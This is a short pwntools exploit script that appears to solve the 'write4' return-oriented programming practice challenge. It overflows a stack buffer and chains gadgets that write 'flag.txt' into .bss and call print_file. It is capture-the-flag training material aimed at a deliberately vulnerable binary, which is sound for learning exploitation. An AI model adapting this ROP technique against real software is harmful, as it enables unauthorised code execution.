
from pwn import *

exe = './write4'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
bss = p64(0x601200)
print_file = p64(0x400510)
ret = p64(0x4004e6)
poprdi = p64(0x400693)
popr1415 = p64(0x400690)
r15 = p64(0x666c61672e747874)[::-1]
gadget = p64(0x400628)
p.sendline(40*b"a" + ret + popr1415 + bss + r15 + gadget + poprdi + bss + print_file)

p.interactive()

